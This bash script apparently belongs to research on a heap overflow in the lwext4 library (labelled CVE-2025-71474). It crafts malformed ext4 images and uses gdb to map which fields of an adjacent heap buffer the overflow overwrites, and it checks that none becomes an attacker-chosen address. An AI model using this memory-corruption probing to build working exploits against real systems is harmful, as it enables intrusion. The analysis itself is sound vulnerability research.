#!/usr/bin/env bash
# CVE-2025-71474 heap-layout probe: which *named* fields of the adjacent live
# ext4_buf the image-chosen bit-set reaches, and the byte-level ceiling.
#
# The bit-set loop at src/ext4_fs.c:333 sets bits 0..bit_max-1 of the one-block
# bitmap buffer, where bit_max = 2 + s_reserved_gdt_blocks. The adjacent real
# ext4_buf header begins at data+4112 and spans 144 bytes. This runner reads
# all 18 eight-byte words of that object before and after the loop for several
# superblock field values, then checks each byte against the prefix-OR model
# (a covered byte becomes 0xff; the boundary byte gets a low-bit prefix mask;
# bytes past the boundary are untouched). No command, no network, no r5.
set -u
cd "$(dirname "$0")"
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }

cd real
if [ ! -f build-vuln-gdt/src/liblwext4.a ]; then
    cmake -S lwext4-upstream/vuln -B build-vuln-gdt -DLIB_ONLY=1 \
        -DCMAKE_C_FLAGS='-g -O0' > evidence/build-vuln-gdt.log 2>&1 \
        && cmake --build build-vuln-gdt -j4 >> evidence/build-vuln-gdt.log 2>&1 \
        && ok "plain vulnerable library build (layout probe)" \
        || bad "plain vulnerable library build (layout probe)"
else
    ok "reuse plain vulnerable library build (layout probe)"
fi

gcc -g -O0 -Ilwext4-upstream/vuln/include \
    -Ilwext4-upstream/vuln/blockdev/linux -Ibuild-vuln-gdt/include \
    mount_driver.c lwext4-upstream/vuln/blockdev/linux/ext4_filedev.c \
    -Wl,--start-group build-vuln-gdt/src/liblwext4.a \
    build-vuln-gdt/blockdev/libblockdev.a -Wl,--end-group \
    -o driver-vuln-gdt > evidence/compile-vuln-gdt.log 2>&1 \
    && ok "plain gdt driver build (layout probe)" \
    || bad "plain gdt driver build (layout probe)"

LOG=evidence/real-vuln-71474-gdt-layout-gdb.out
: > "$LOG"
: > evidence/craft-gdt-layout.out
# 8 in-bounds control; the others reach successive named fields of ext4_buf:
# flags/lba/data/refctr (~33023), bc (~33215), lba_node (~33671),
# lru_node (~33863), end_write (~33919), end_write_arg (~33983).
for gdt in 8 33215 33222 33230 33247 33919 33926 33990 34000; do
    python3 craft_image_71474.py image-base.ext4 "image-gdt-$gdt.ext4" "$gdt" \
        >> evidence/craft-gdt-layout.out 2>&1 || bad "craft layout gdt=$gdt image"
    echo "=== GDT=$gdt ===" >> "$LOG"
    gdb -q -batch \
        -ex 'set pagination off' -ex 'break ext4_fs.c:332' -ex run \
        -ex 'printf "DELTA=%ld SIZEOF=%lu BUF=%p\n", (long)((char*)block_bitmap.buf-(char*)block_bitmap.data), (unsigned long)sizeof(struct ext4_buf), block_bitmap.buf' \
        -ex 'x/18gx block_bitmap.buf' \
        -ex 'advance 335' \
        -ex 'x/18gx block_bitmap.buf' \
        --args ./driver-vuln-gdt mount "image-gdt-$gdt.ext4" >> "$LOG" 2>&1
done

python3 summarize_gdt_layout.py "$LOG" > evidence/real-vuln-71474-gdt-layout-summary.out \
    && ok "named-field readback summarized" || bad "named-field readback summarized"
cat evidence/real-vuln-71474-gdt-layout-summary.out
[ "$(grep -c '^LAYOUT_BITS .* MATCH=1$' evidence/real-vuln-71474-gdt-layout-summary.out)" -eq 9 ] \
    && ok "prefix-OR model holds for all 9 named-field readbacks" \
    || bad "prefix-OR model holds for all 9 named-field readbacks"
[ "$(grep -c '^NO_CHOSEN_PTR .* MATCH=1$' evidence/real-vuln-71474-gdt-layout-summary.out)" -eq 8 ] \
    && ok "no field becomes a chosen address (8 crafted images)" \
    || bad "no field becomes a chosen address (8 crafted images)"

echo "LAYOUT_PASS=$pass LAYOUT_FAIL=$fail"
[ "$fail" -eq 0 ] && echo 'GDT LAYOUT PROBE PASS' || echo 'GDT LAYOUT PROBE FAIL'
exit "$fail"
